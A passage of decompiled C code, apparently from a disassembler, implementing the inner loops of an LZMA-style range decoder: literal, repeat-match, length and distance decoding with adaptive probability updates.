            if (local_70 <= (ushort *)(ulong)uVar15) {
              lVar24 = lVar23;
            }
            uVar16 = (uint)*(byte *)((long)local_70 + lVar24 + lVar48 + (-1 - (long)(ulong)uVar15));
            uVar40 = uVar16 * 2 & 0x100;
            uVar5 = *(ushort *)(lVar36 + (ulong)(uVar40 + 0x101) * 2);
            uVar28 = (uVar40 + 0x101) * 2;
            if (uVar14 < 0x1000000) {
              uVar39 = CONCAT31((int3)uVar39,*pbVar41);
              uVar14 = uVar14 * 0x100;
              pbVar41 = pbVar41 + 1;
            }
            uVar31 = (uVar14 >> 0xb) * (uint)uVar5;
            bVar45 = uVar39 < uVar31;
            uVar30 = uVar31;
            if (!bVar45) {
              uVar30 = uVar14 - uVar31;
            }
            uVar14 = uVar39 - uVar31;
            if (bVar45) {
              uVar14 = uVar39;
            }
            uVar39 = uVar40 ^ 0x100;
            uVar31 = uVar5 - 0x7e1;
            if (!bVar45) {
              uVar39 = uVar40;
              uVar31 = (uint)uVar5;
            }
            *(ushort *)(lVar36 + (ulong)uVar28) = uVar5 - (short)(uVar31 >> 5);
            uVar40 = uVar16 * 4 & uVar39;
            uVar28 = ((uVar28 + 1) - (uint)bVar45 & 0x1ff) + uVar39 + uVar40;
            uVar5 = *(ushort *)(lVar36 + (ulong)uVar28 * 2);
            uVar28 = uVar28 * 2;
            if (uVar30 < 0x1000000) {
              uVar14 = CONCAT31((int3)uVar14,*pbVar41);
              uVar30 = uVar30 << 8;
              pbVar41 = pbVar41 + 1;
            }
            uVar32 = (uVar30 >> 0xb) * (uint)uVar5;
            bVar45 = uVar14 < uVar32;
            uVar31 = uVar32;
            if (!bVar45) {
              uVar31 = uVar30 - uVar32;
            }
            uVar30 = uVar14 - uVar32;
            if (bVar45) {
              uVar30 = uVar14;
            }
            uVar39 = uVar39 ^ uVar40;
            uVar14 = uVar5 - 0x7e1;
            if (!bVar45) {
              uVar39 = uVar40;
              uVar14 = (uint)uVar5;
            }
            *(ushort *)(lVar36 + (ulong)uVar28) = uVar5 - (short)(uVar14 >> 5);
            uVar14 = uVar16 << 3 & uVar39;
            uVar28 = ((uVar28 + 1) - (uint)bVar45 & 0x1ff) + uVar39 + uVar14;
            uVar5 = *(ushort *)(lVar36 + (ulong)uVar28 * 2);
            uVar28 = uVar28 * 2;
            if (uVar31 < 0x1000000) {
              uVar30 = CONCAT31((int3)uVar30,*pbVar41);
              uVar31 = uVar31 << 8;
              pbVar41 = pbVar41 + 1;
            }
            uVar32 = (uVar31 >> 0xb) * (uint)uVar5;
            bVar45 = uVar30 < uVar32;
            uVar40 = uVar32;
            if (!bVar45) {
              uVar40 = uVar31 - uVar32;
            }
            uVar31 = uVar30 - uVar32;
            if (bVar45) {
              uVar31 = uVar30;
            }
            uVar39 = uVar39 ^ uVar14;
            uVar30 = uVar5 - 0x7e1;
            if (!bVar45) {
              uVar39 = uVar14;
              uVar30 = (uint)uVar5;
            }
            *(ushort *)(lVar36 + (ulong)uVar28) = uVar5 - (short)(uVar30 >> 5);
            uVar14 = uVar16 << 4 & uVar39;
            uVar28 = ((uVar28 + 1) - (uint)bVar45 & 0x1ff) + uVar39 + uVar14;
            uVar5 = *(ushort *)(lVar36 + (ulong)uVar28 * 2);
            uVar28 = uVar28 * 2;
            if (uVar40 < 0x1000000) {
              uVar31 = CONCAT31((int3)uVar31,*pbVar41);
              uVar40 = uVar40 << 8;
              pbVar41 = pbVar41 + 1;
            }
            uVar32 = (uVar40 >> 0xb) * (uint)uVar5;
            bVar45 = uVar31 < uVar32;
            uVar30 = uVar32;
            if (!bVar45) {
              uVar30 = uVar40 - uVar32;
            }
            uVar40 = uVar31 - uVar32;
            if (bVar45) {
              uVar40 = uVar31;
            }
            uVar39 = uVar39 ^ uVar14;
            uVar31 = uVar5 - 0x7e1;
            if (!bVar45) {
              uVar39 = uVar14;
              uVar31 = (uint)uVar5;
            }
            *(ushort *)(lVar36 + (ulong)uVar28) = uVar5 - (short)(uVar31 >> 5);
            uVar14 = uVar16 << 5 & uVar39;
            uVar28 = ((uVar28 + 1) - (uint)bVar45 & 0x1ff) + uVar39 + uVar14;
            uVar5 = *(ushort *)(lVar36 + (ulong)uVar28 * 2);
            uVar28 = uVar28 * 2;
            if (uVar30 < 0x1000000) {
              uVar40 = CONCAT31((int3)uVar40,*pbVar41);
              uVar30 = uVar30 << 8;
              pbVar41 = pbVar41 + 1;
            }
            uVar32 = (uVar30 >> 0xb) * (uint)uVar5;
            bVar45 = uVar40 < uVar32;
            uVar31 = uVar32;
            if (!bVar45) {
              uVar31 = uVar30 - uVar32;
            }
            uVar30 = uVar40 - uVar32;
            if (bVar45) {
              uVar30 = uVar40;
            }
            uVar39 = uVar39 ^ uVar14;
            uVar40 = uVar5 - 0x7e1;
            if (!bVar45) {
              uVar39 = uVar14;
              uVar40 = (uint)uVar5;
            }
            *(ushort *)(lVar36 + (ulong)uVar28) = uVar5 - (short)(uVar40 >> 5);
            uVar14 = uVar16 << 6 & uVar39;
            uVar28 = ((uVar28 + 1) - (uint)bVar45 & 0x1ff) + uVar39 + uVar14;
            uVar5 = *(ushort *)(lVar36 + (ulong)uVar28 * 2);
            uVar28 = uVar28 * 2;
            if (uVar31 < 0x1000000) {
              uVar30 = CONCAT31((int3)uVar30,*pbVar41);
              uVar31 = uVar31 << 8;
              pbVar41 = pbVar41 + 1;
            }
            uVar32 = (uVar31 >> 0xb) * (uint)uVar5;
            bVar45 = uVar30 < uVar32;
            uVar40 = uVar32;
            if (!bVar45) {
              uVar40 = uVar31 - uVar32;
            }
            uVar31 = uVar30 - uVar32;
            if (bVar45) {
              uVar31 = uVar30;
            }
            uVar39 = uVar39 ^ uVar14;
            uVar30 = uVar5 - 0x7e1;
            if (!bVar45) {
              uVar39 = uVar14;
              uVar30 = (uint)uVar5;
            }
            *(ushort *)(lVar36 + (ulong)uVar28) = uVar5 - (short)(uVar30 >> 5);
            uVar14 = uVar16 << 7 & uVar39;
            uVar28 = ((uVar28 + 1) - (uint)bVar45 & 0x1ff) + uVar39 + uVar14;
            uVar5 = *(ushort *)(lVar36 + (ulong)uVar28 * 2);
            uVar28 = uVar28 * 2;
            if (uVar40 < 0x1000000) {
              uVar31 = CONCAT31((int3)uVar31,*pbVar41);
              uVar40 = uVar40 << 8;
              pbVar41 = pbVar41 + 1;
            }
            uVar32 = (uVar40 >> 0xb) * (uint)uVar5;
            bVar45 = uVar31 < uVar32;
            uVar30 = uVar32;
            if (!bVar45) {
              uVar30 = uVar40 - uVar32;
            }
            uVar40 = uVar31 - uVar32;
            if (bVar45) {
              uVar40 = uVar31;
            }
            uVar39 = uVar39 ^ uVar14;
            uVar31 = uVar5 - 0x7e1;
            if (!bVar45) {
              uVar39 = uVar14;
              uVar31 = (uint)uVar5;
            }
            *(ushort *)(lVar36 + (ulong)uVar28) = uVar5 - (short)(uVar31 >> 5);
            uVar14 = ((uVar28 + 1) - (uint)bVar45 & 0x1ff) + uVar39 + (uVar16 << 8 & uVar39);
            uVar5 = *(ushort *)(lVar36 + (ulong)uVar14 * 2);
            uVar14 = uVar14 * 2;
            if (uVar30 < 0x1000000) {
              uVar40 = CONCAT31((int3)uVar40,*pbVar41);
              uVar30 = uVar30 << 8;
              pbVar41 = pbVar41 + 1;
            }
            uVar39 = (uVar30 >> 0xb) * (uint)uVar5;
            bVar45 = uVar40 < uVar39;
            uVar28 = uVar39;
            if (!bVar45) {
              uVar28 = uVar30 - uVar39;
            }
            uVar39 = uVar40 - uVar39;
            if (bVar45) {
              uVar39 = uVar40;
            }
            uVar16 = uVar5 - 0x7e1;
            if (!bVar45) {
              uVar16 = (uint)uVar5;
            }
            cVar42 = ((char)uVar14 + '\x01') - bVar45;
            *(ushort *)(lVar36 + (ulong)uVar14) = uVar5 - (short)(uVar16 >> 5);
          }
          *(char *)(lVar48 + (long)local_70) = cVar42;
          if (cVar3 == '\0') {
LAB_0011ebd8:
            puVar44 = (ushort *)((long)local_70 + 1);
            puVar22 = (ushort *)((long)local_70 - 0x23f);
          }
          else {
LAB_0011ec40:
            puVar44 = (ushort *)((long)local_70 + 1);
          }
        }
        else {
          uVar28 = uVar28 - uVar14;
          uVar39 = uVar39 - uVar14;
          *(ushort *)(lVar24 + 0x6000) = uVar5 - (uVar5 >> 5);
          if (uVar28 < 0x1000000) {
            bVar4 = *pbVar41;
            uVar28 = uVar28 * 0x100;
            pbVar41 = pbVar41 + 1;
            uVar39 = uVar39 * 0x100 | (uint)bVar4;
          }
          lVar2 = param_1 + (ulong)uVar27 * 2;
          uVar5 = *(ushort *)(lVar2 + 0x6180);
          uVar14 = (uVar28 >> 0xb) * (uint)uVar5;
          uVar16 = local_ac;
          if (uVar39 < uVar14) {
            *(ushort *)(lVar2 + 0x6180) = uVar5 + (short)(0x800 - uVar5 >> 5);
            uVar27 = (-(uint)(uVar27 < 7) & 0xfffffffd) + 10;
            if (uVar14 < 0x1000000) {
              bVar4 = *pbVar41;
              uVar14 = uVar14 * 0x100;
              pbVar41 = pbVar41 + 1;
              uVar39 = uVar39 << 8 | (uint)bVar4;
            }
            uVar5 = *(ushort *)(param_1 + 0x6664);
            uVar28 = (uVar14 >> 0xb) * (uint)uVar5;
            if (uVar39 < uVar28) {
              lVar36 = param_1 + 0x6668 + uVar43 * 0x10;
              *(ushort *)(param_1 + 0x6664) = uVar5 + (short)(0x800 - uVar5 >> 5);
              uVar5 = *(ushort *)(lVar36 + 2);
              if (uVar28 < 0x1000000) {
                uVar39 = CONCAT31((int3)uVar39,*pbVar41);
                uVar28 = uVar28 * 0x100;
                pbVar41 = pbVar41 + 1;
              }
              uVar29 = (uVar28 >> 0xb) * (uint)uVar5;
              bVar45 = uVar39 < uVar29;
              uVar14 = uVar29;
              if (!bVar45) {
                uVar14 = uVar28 - uVar29;
              }
              uVar6 = *(ushort *)(lVar36 + 4);
              if (!bVar45) {
                uVar6 = *(ushort *)(lVar36 + 6);
              }
              uVar40 = (uint)uVar6;
              uVar28 = uVar5 - 0x7e1;
              if (!bVar45) {
                uVar28 = (uint)uVar5;
                uVar39 = uVar39 - uVar29;
              }
              uVar29 = 3 - bVar45;
              *(ushort *)(lVar36 + 2) = uVar5 - (short)(uVar28 >> 5);
              if (uVar14 < 0x1000000) {
                uVar39 = CONCAT31((int3)uVar39,*pbVar41);
                uVar14 = uVar14 << 8;
                pbVar41 = pbVar41 + 1;
              }
              uVar30 = (uVar14 >> 0xb) * uVar40;
              bVar45 = uVar39 < uVar30;
              uVar28 = uVar30;
              if (!bVar45) {
                uVar28 = uVar14 - uVar30;
              }
              uVar5 = *(ushort *)(lVar36 + (ulong)uVar29 * 4);
              if (!bVar45) {
                uVar5 = *(ushort *)(lVar36 + 2 + (ulong)uVar29 * 4);
              }
              uVar31 = (uint)uVar5;
              uVar14 = uVar39 - uVar30;
              if (bVar45) {
                uVar14 = uVar39;
              }
              uVar39 = uVar40 - 0x7e1;
              if (!bVar45) {
                uVar39 = uVar40;
              }
              *(ushort *)(lVar36 + (ulong)(uVar29 * 2)) = uVar6 - (short)(uVar39 >> 5);
              uVar39 = ((uVar29 * 2 + 1) - (uint)bVar45) * 2;
              if (uVar28 < 0x1000000) {
                uVar14 = CONCAT31((int3)uVar14,*pbVar41);
                uVar28 = uVar28 << 8;
                pbVar41 = pbVar41 + 1;
              }
              uVar29 = (uVar28 >> 0xb) * uVar31;
              uVar28 = uVar28 - uVar29;
              bVar45 = uVar14 < uVar29;
              uVar40 = uVar14 - uVar29;
              if (bVar45) {
                uVar40 = uVar14;
                uVar28 = uVar29;
              }
              uVar14 = uVar31 - 0x7e1;
              if (!bVar45) {
                uVar14 = uVar31;
              }
              uVar29 = (uVar39 - 5) - (uint)bVar45;
              *(ushort *)(lVar36 + (ulong)uVar39) = uVar5 - (short)(uVar14 >> 5);
            }
            else {
              uVar14 = uVar14 - uVar28;
              uVar39 = uVar39 - uVar28;
              *(ushort *)(param_1 + 0x6664) = uVar5 - (uVar5 >> 5);
              if (uVar14 < 0x1000000) {
                bVar4 = *pbVar41;
                uVar14 = uVar14 * 0x100;
                pbVar41 = pbVar41 + 1;
                uVar39 = uVar39 * 0x100 | (uint)bVar4;
              }
              uVar5 = *(ushort *)(param_1 + 0x6666);
              uVar28 = (uVar14 >> 0xb) * (uint)uVar5;
              if (uVar39 < uVar28) {
                lVar36 = param_1 + 0x6768 + uVar43 * 0x10;
                *(ushort *)(param_1 + 0x6666) = uVar5 + (short)(0x800 - uVar5 >> 5);
                uVar5 = *(ushort *)(lVar36 + 2);
                if (uVar28 < 0x1000000) {
                  uVar39 = CONCAT31((int3)uVar39,*pbVar41);
                  uVar28 = uVar28 * 0x100;
                  pbVar41 = pbVar41 + 1;
                }
                uVar29 = (uVar28 >> 0xb) * (uint)uVar5;
                bVar45 = uVar39 < uVar29;
                uVar14 = uVar29;
                if (!bVar45) {
                  uVar14 = uVar28 - uVar29;
                }
                uVar6 = *(ushort *)(lVar36 + 4);
                if (!bVar45) {
                  uVar6 = *(ushort *)(lVar36 + 6);
                }
                uVar40 = (uint)uVar6;
                uVar28 = uVar5 - 0x7e1;
                if (!bVar45) {
                  uVar28 = (uint)uVar5;
                  uVar39 = uVar39 - uVar29;
                }
                uVar29 = 3 - bVar45;
                *(ushort *)(lVar36 + 2) = uVar5 - (short)(uVar28 >> 5);
                if (uVar14 < 0x1000000) {
                  uVar39 = CONCAT31((int3)uVar39,*pbVar41);
                  uVar14 = uVar14 << 8;
                  pbVar41 = pbVar41 + 1;
                }
                uVar30 = (uVar14 >> 0xb) * uVar40;
                bVar45 = uVar39 < uVar30;
                uVar28 = uVar30;
                if (!bVar45) {
                  uVar28 = uVar14 - uVar30;
                }
                uVar5 = *(ushort *)(lVar36 + (ulong)uVar29 * 4);
                if (!bVar45) {
                  uVar5 = *(ushort *)(lVar36 + 2 + (ulong)uVar29 * 4);
                }
                uVar31 = (uint)uVar5;
                uVar14 = uVar39 - uVar30;
                if (bVar45) {
                  uVar14 = uVar39;
                }
                uVar39 = uVar40 - 0x7e1;
                if (!bVar45) {
                  uVar39 = uVar40;
                }
                *(ushort *)(lVar36 + (ulong)(uVar29 * 2)) = uVar6 - (short)(uVar39 >> 5);
                uVar39 = ((uVar29 * 2 + 1) - (uint)bVar45) * 2;
                if (uVar28 < 0x1000000) {
                  uVar14 = CONCAT31((int3)uVar14,*pbVar41);
                  uVar28 = uVar28 << 8;
                  pbVar41 = pbVar41 + 1;
                }
                uVar29 = (uVar28 >> 0xb) * uVar31;
                uVar28 = uVar28 - uVar29;
                bVar45 = uVar14 < uVar29;
                uVar40 = uVar14 - uVar29;
                if (bVar45) {
                  uVar40 = uVar14;
                  uVar28 = uVar29;
                }
                uVar14 = uVar31 - 0x7e1;
                if (!bVar45) {
                  uVar14 = uVar31;
                }
                uVar29 = (uVar39 + 3) - (uint)bVar45;
                *(ushort *)(lVar36 + (ulong)uVar39) = uVar5 - (short)(uVar14 >> 5);
              }
              else {
                uVar14 = uVar14 - uVar28;
                lVar36 = param_1 + 0x6868;
                uVar39 = uVar39 - uVar28;
                *(ushort *)(param_1 + 0x6666) = uVar5 - (uVar5 >> 5);
                uVar5 = *(ushort *)(param_1 + 0x686a);
                if (uVar14 < 0x1000000) {
                  uVar39 = CONCAT31((int3)uVar39,*pbVar41);
                  uVar14 = uVar14 * 0x100;
                  pbVar41 = pbVar41 + 1;
                }
                uVar29 = (uVar14 >> 0xb) * (uint)uVar5;
                bVar45 = uVar39 < uVar29;
                uVar28 = uVar29;
                if (!bVar45) {
                  uVar28 = uVar14 - uVar29;
                }
                uVar6 = *(ushort *)(param_1 + 0x686c);
                if (!bVar45) {
                  uVar6 = *(ushort *)(param_1 + 0x686e);
                }
                uVar40 = (uint)uVar6;
                uVar14 = uVar5 - 0x7e1;
                if (!bVar45) {
                  uVar14 = (uint)uVar5;
                  uVar39 = uVar39 - uVar29;
                }
                uVar29 = 3 - bVar45;
                *(ushort *)(param_1 + 0x686a) = uVar5 - (short)(uVar14 >> 5);
                if (uVar28 < 0x1000000) {
                  uVar39 = CONCAT31((int3)uVar39,*pbVar41);
                  uVar28 = uVar28 << 8;
                  pbVar41 = pbVar41 + 1;
                }
                uVar30 = (uVar28 >> 0xb) * uVar40;
                bVar45 = uVar39 < uVar30;
                uVar14 = uVar30;
                if (!bVar45) {
                  uVar14 = uVar28 - uVar30;
                }
                uVar5 = *(ushort *)(lVar36 + (ulong)uVar29 * 4);
                if (!bVar45) {
                  uVar5 = *(ushort *)(param_1 + 0x686a + (ulong)uVar29 * 4);
                }
                uVar31 = (uint)uVar5;
                uVar28 = uVar39 - uVar30;
                if (bVar45) {
                  uVar28 = uVar39;
                }
                uVar39 = uVar40 - 0x7e1;
                if (!bVar45) {
                  uVar39 = uVar40;
                }
                uVar40 = (uVar29 * 2 + 1) - (uint)bVar45;
                *(ushort *)(lVar36 + (ulong)(uVar29 * 2)) = uVar6 - (short)(uVar39 >> 5);
                if (uVar14 < 0x1000000) {
                  uVar28 = CONCAT31((int3)uVar28,*pbVar41);
                  uVar14 = uVar14 << 8;
                  pbVar41 = pbVar41 + 1;
                }
                uVar29 = (uVar14 >> 0xb) * uVar31;
                bVar45 = uVar28 < uVar29;
                uVar39 = uVar29;
                if (!bVar45) {
                  uVar39 = uVar14 - uVar29;
                }
                uVar6 = *(ushort *)(lVar36 + (ulong)uVar40 * 4);
                if (!bVar45) {
                  uVar6 = *(ushort *)(param_1 + 0x686a + (ulong)uVar40 * 4);
                }
                uVar30 = (uint)uVar6;
                uVar14 = uVar28 - uVar29;
                if (bVar45) {
                  uVar14 = uVar28;
                }
                uVar28 = uVar31 - 0x7e1;
                if (!bVar45) {
                  uVar28 = uVar31;
                }
                uVar29 = (uVar40 * 2 + 1) - (uint)bVar45;
                *(ushort *)(lVar36 + (ulong)(uVar40 * 2)) = uVar5 - (short)(uVar28 >> 5);
                if (uVar39 < 0x1000000) {
                  uVar14 = CONCAT31((int3)uVar14,*pbVar41);
                  uVar39 = uVar39 << 8;
                  pbVar41 = pbVar41 + 1;
                }
                uVar40 = (uVar39 >> 0xb) * uVar30;
                bVar45 = uVar14 < uVar40;
                uVar28 = uVar40;
                if (!bVar45) {
                  uVar28 = uVar39 - uVar40;
                }
                uVar5 = *(ushort *)(lVar36 + (ulong)uVar29 * 4);
                if (!bVar45) {
                  uVar5 = *(ushort *)(param_1 + 0x686a + (ulong)uVar29 * 4);
                }
                uVar31 = (uint)uVar5;
                uVar39 = uVar14 - uVar40;
                if (bVar45) {
                  uVar39 = uVar14;
                }
                uVar14 = uVar30 - 0x7e1;
                if (!bVar45) {
                  uVar14 = uVar30;
                }
                uVar40 = (uVar29 * 2 + 1) - (uint)bVar45;
                *(ushort *)(lVar36 + (ulong)(uVar29 * 2)) = uVar6 - (short)(uVar14 >> 5);
                if (uVar28 < 0x1000000) {
                  uVar39 = CONCAT31((int3)uVar39,*pbVar41);
                  uVar28 = uVar28 << 8;
                  pbVar41 = pbVar41 + 1;
                }
                uVar29 = (uVar28 >> 0xb) * uVar31;
                bVar45 = uVar39 < uVar29;
                uVar14 = uVar29;
                if (!bVar45) {
                  uVar14 = uVar28 - uVar29;
                }
                uVar6 = *(ushort *)(lVar36 + (ulong)uVar40 * 4);
                if (!bVar45) {
                  uVar6 = *(ushort *)(param_1 + 0x686a + (ulong)uVar40 * 4);
                }
                uVar30 = (uint)uVar6;
                uVar28 = uVar39 - uVar29;
                if (bVar45) {
                  uVar28 = uVar39;
                }
                uVar39 = uVar31 - 0x7e1;
                if (!bVar45) {
                  uVar39 = uVar31;
                }
                uVar29 = (uVar40 * 2 + 1) - (uint)bVar45;
                *(ushort *)(lVar36 + (ulong)(uVar40 * 2)) = uVar5 - (short)(uVar39 >> 5);
                if (uVar14 < 0x1000000) {
                  uVar28 = CONCAT31((int3)uVar28,*pbVar41);
                  uVar14 = uVar14 << 8;
                  pbVar41 = pbVar41 + 1;
                }
                uVar40 = (uVar14 >> 0xb) * uVar30;
                bVar45 = uVar28 < uVar40;
                uVar39 = uVar40;
                if (!bVar45) {
                  uVar39 = uVar14 - uVar40;
                }
                uVar5 = *(ushort *)(lVar36 + (ulong)uVar29 * 4);
                if (!bVar45) {
                  uVar5 = *(ushort *)(param_1 + 0x686a + (ulong)uVar29 * 4);
                }
                uVar31 = (uint)uVar5;
                uVar14 = uVar28 - uVar40;
                if (bVar45) {
                  uVar14 = uVar28;
                }
                uVar28 = uVar30 - 0x7e1;
                if (!bVar45) {
                  uVar28 = uVar30;
                }
                uVar40 = (uVar29 * 2 + 1) - (uint)bVar45;
                *(ushort *)(lVar36 + (ulong)(uVar29 * 2)) = uVar6 - (short)(uVar28 >> 5);
                if (uVar39 < 0x1000000) {
                  uVar14 = CONCAT31((int3)uVar14,*pbVar41);
                  uVar39 = uVar39 << 8;
                  pbVar41 = pbVar41 + 1;
                }
                uVar29 = (uVar39 >> 0xb) * uVar31;
                bVar45 = uVar14 < uVar29;
                uVar28 = uVar29;
                if (!bVar45) {
                  uVar28 = uVar39 - uVar29;
                }
                uVar6 = *(ushort *)(lVar36 + (ulong)uVar40 * 4);
                if (!bVar45) {
                  uVar6 = *(ushort *)(param_1 + 0x686a + (ulong)uVar40 * 4);
                }
                uVar30 = (uint)uVar6;
                uVar39 = uVar14 - uVar29;
                if (bVar45) {
                  uVar39 = uVar14;
                }
                uVar14 = uVar31 - 0x7e1;
                if (!bVar45) {
                  uVar14 = uVar31;
                }
                *(ushort *)(lVar36 + (ulong)(uVar40 * 2)) = uVar5 - (short)(uVar14 >> 5);
                uVar14 = ((uVar40 * 2 + 1) - (uint)bVar45) * 2;
                if (uVar28 < 0x1000000) {
                  uVar39 = CONCAT31((int3)uVar39,*pbVar41);
                  uVar28 = uVar28 << 8;
                  pbVar41 = pbVar41 + 1;
                }
                uVar29 = (uVar28 >> 0xb) * uVar30;
                uVar28 = uVar28 - uVar29;
                bVar45 = uVar39 < uVar29;
                uVar40 = uVar39 - uVar29;
                if (bVar45) {
                  uVar40 = uVar39;
                  uVar28 = uVar29;
                }
                uVar39 = uVar30 - 0x7e1;
                if (!bVar45) {
                  uVar39 = uVar30;
                }
                uVar29 = (uVar14 - 0xed) - (uint)bVar45;
                *(ushort *)(lVar36 + (ulong)uVar14) = uVar6 - (short)(uVar39 >> 5);
              }
            }
            uVar39 = 5;
            if (uVar29 < 6) {
              uVar39 = uVar29;
            }
            lVar36 = param_1 + 0x6360 + (ulong)(uVar39 - 2) * 0x80;
            uVar5 = *(ushort *)(lVar36 + 2);
            if (uVar28 < 0x1000000) {
              uVar40 = CONCAT31((int3)uVar40,*pbVar41);
              uVar28 = uVar28 << 8;
              pbVar41 = pbVar41 + 1;
            }
            uVar14 = (uVar28 >> 0xb) * (uint)uVar5;
            bVar45 = uVar40 < uVar14;
            uVar39 = uVar14;
            if (!bVar45) {
              uVar39 = uVar28 - uVar14;
            }
            uVar6 = *(ushort *)(lVar36 + 4);
            if (!bVar45) {
              uVar6 = *(ushort *)(lVar36 + 6);
            }
            uVar30 = (uint)uVar6;
            uVar28 = uVar5 - 0x7e1;
            if (!bVar45) {
              uVar28 = (uint)uVar5;
              uVar40 = uVar40 - uVar14;
            }
            uVar14 = 3 - bVar45;
            *(ushort *)(lVar36 + 2) = uVar5 - (short)(uVar28 >> 5);
            if (uVar39 < 0x1000000) {
              uVar40 = CONCAT31((int3)uVar40,*pbVar41);
              uVar39 = uVar39 << 8;
              pbVar41 = pbVar41 + 1;
            }
            uVar31 = (uVar39 >> 0xb) * uVar30;
            bVar45 = uVar40 < uVar31;
            uVar28 = uVar31;
            if (!bVar45) {
              uVar28 = uVar39 - uVar31;
            }
            uVar5 = *(ushort *)(lVar36 + (ulong)uVar14 * 4);
            if (!bVar45) {
              uVar5 = *(ushort *)(lVar36 + 2 + (ulong)uVar14 * 4);
            }
            uVar32 = (uint)uVar5;
            uVar39 = uVar40 - uVar31;
            if (bVar45) {
              uVar39 = uVar40;
            }
            uVar40 = uVar30 - 0x7e1;
            if (!bVar45) {
              uVar40 = uVar30;
            }
            uVar30 = (uVar14 * 2 + 1) - (uint)bVar45;
            *(ushort *)(lVar36 + (ulong)(uVar14 * 2)) = uVar6 - (short)(uVar40 >> 5);
            if (uVar28 < 0x1000000) {
              uVar39 = CONCAT31((int3)uVar39,*pbVar41);
              uVar28 = uVar28 << 8;
              pbVar41 = pbVar41 + 1;
            }
            uVar40 = (uVar28 >> 0xb) * uVar32;
            bVar45 = uVar39 < uVar40;
            uVar14 = uVar40;
            if (!bVar45) {
              uVar14 = uVar28 - uVar40;
            }
            uVar6 = *(ushort *)(lVar36 + (ulong)uVar30 * 4);
            if (!bVar45) {
              uVar6 = *(ushort *)(lVar36 + 2 + (ulong)uVar30 * 4);
            }
            uVar31 = (uint)uVar6;
            uVar28 = uVar39 - uVar40;
            if (bVar45) {
              uVar28 = uVar39;
            }
            uVar39 = uVar32 - 0x7e1;
            if (!bVar45) {
              uVar39 = uVar32;
            }
            uVar40 = (uVar30 * 2 + 1) - (uint)bVar45;
            *(ushort *)(lVar36 + (ulong)(uVar30 * 2)) = uVar5 - (short)(uVar39 >> 5);
            if (uVar14 < 0x1000000) {
              uVar28 = CONCAT31((int3)uVar28,*pbVar41);
              uVar14 = uVar14 << 8;
              pbVar41 = pbVar41 + 1;
            }
            uVar30 = (uVar14 >> 0xb) * uVar31;
            bVar45 = uVar28 < uVar30;
            uVar39 = uVar30;
            if (!bVar45) {
              uVar39 = uVar14 - uVar30;
            }
            uVar5 = *(ushort *)(lVar36 + (ulong)uVar40 * 4);
            if (!bVar45) {
              uVar5 = *(ushort *)(lVar36 + 2 + (ulong)uVar40 * 4);
            }
            uVar32 = (uint)uVar5;
            uVar14 = uVar28 - uVar30;
            if (bVar45) {
              uVar14 = uVar28;
            }
            uVar28 = uVar31 - 0x7e1;
            if (!bVar45) {
              uVar28 = uVar31;
            }
            uVar30 = (uVar40 * 2 + 1) - (uint)bVar45;
            *(ushort *)(lVar36 + (ulong)(uVar40 * 2)) = uVar6 - (short)(uVar28 >> 5);
            if (uVar39 < 0x1000000) {
              uVar14 = CONCAT31((int3)uVar14,*pbVar41);
              uVar39 = uVar39 << 8;
              pbVar41 = pbVar41 + 1;
            }
            uVar40 = (uVar39 >> 0xb) * uVar32;
            bVar45 = uVar14 < uVar40;
            uVar28 = uVar40;
            if (!bVar45) {
              uVar28 = uVar39 - uVar40;
            }
            uVar6 = *(ushort *)(lVar36 + (ulong)uVar30 * 4);
            if (!bVar45) {
              uVar6 = *(ushort *)(lVar36 + 2 + (ulong)uVar30 * 4);
            }
            uVar31 = (uint)uVar6;
            uVar40 = uVar14 - uVar40;
            if (bVar45) {
              uVar40 = uVar14;
            }
            uVar39 = uVar32 - 0x7e1;
            if (!bVar45) {
              uVar39 = uVar32;
            }
            *(ushort *)(lVar36 + (ulong)(uVar30 * 2)) = uVar5 - (short)(uVar39 >> 5);
            uVar14 = ((uVar30 * 2 + 1) - (uint)bVar45) * 2;
            if (uVar28 < 0x1000000) {
              uVar40 = CONCAT31((int3)uVar40,*pbVar41);
              uVar28 = uVar28 << 8;
              pbVar41 = pbVar41 + 1;
            }
            uVar30 = (uVar28 >> 0xb) * uVar31;
            uVar28 = uVar28 - uVar30;
            bVar45 = uVar40 < uVar30;
            uVar39 = uVar40 - uVar30;
            if (bVar45) {
              uVar39 = uVar40;
              uVar28 = uVar30;
            }
            uVar30 = uVar31 - 0x7e1;
            if (!bVar45) {
              uVar30 = uVar31;
            }
            uVar40 = (uVar14 - 0x3f) - (uint)bVar45;
            uVar30 = uVar30 >> 5;
            *(ushort *)(lVar36 + (ulong)uVar14) = uVar6 - (short)uVar30;
            if (3 < uVar40) {
              iVar13 = (uVar40 & 1) + 2;
              if (uVar40 < 0xe) {
                iVar25 = (uVar40 >> 1) - 1;
                uVar18 = (ulong)uVar40;
                uVar40 = iVar13 << ((byte)iVar25 & 0x1f);
                lVar36 = param_1 + 0x655e + (uVar40 - uVar18) * 2;
                uVar18 = 1;
                uVar14 = 1;
                do {
                  uVar38 = uVar14 * 2;
                  uVar5 = *(ushort *)(lVar36 + uVar18 * 2);
                  uVar30 = uVar14 + uVar40;
                  if (uVar28 < 0x1000000) {
                    uVar39 = CONCAT31((int3)uVar39,*pbVar41);
                    uVar28 = uVar28 << 8;
                    pbVar41 = pbVar41 + 1;
                  }
                  uVar14 = (uVar28 >> 0xb) * (uint)uVar5;
                  uVar31 = uVar28 - uVar14;
                  bVar45 = uVar39 < uVar14;
                  uVar28 = uVar14;
                  if (!bVar45) {
                    uVar28 = uVar31;
                  }
                  uVar31 = uVar5 - 0x7e1;
                  if (!bVar45) {
                    uVar40 = uVar30;
                    uVar31 = (uint)uVar5;
                    uVar39 = uVar39 - uVar14;
                  }
                  *(ushort *)(lVar36 + uVar18 * 2) = uVar5 - (short)((int)uVar31 >> 5);
                  iVar25 = iVar25 - 1;
                  uVar18 = (ulong)(((int)uVar18 * 2 + 1) - (uint)bVar45);
                  uVar14 = uVar38;
                } while (iVar25 != 0);
              }
              else {
                iVar25 = (uVar40 >> 1) - 5;
                do {
                  iVar10 = iVar13 * 2;
                  iVar13 = iVar10 + 1;
                  if (uVar28 < 0x1000000) {
                    uVar39 = CONCAT31((int3)uVar39,*pbVar41);
                    uVar28 = uVar28 << 8;
                    pbVar41 = pbVar41 + 1;
                  }
                  uVar28 = uVar28 >> 1;
                  uVar14 = uVar39 - uVar28;
                  if ((int)(uVar39 - uVar28) < 0) {
                    uVar14 = uVar39;
                    iVar13 = iVar10;
                  }
                  uVar39 = uVar14;
                  iVar25 = iVar25 - 1;
                } while (iVar25 != 0);
                uVar5 = *(ushort *)(param_1 + 0x6646);
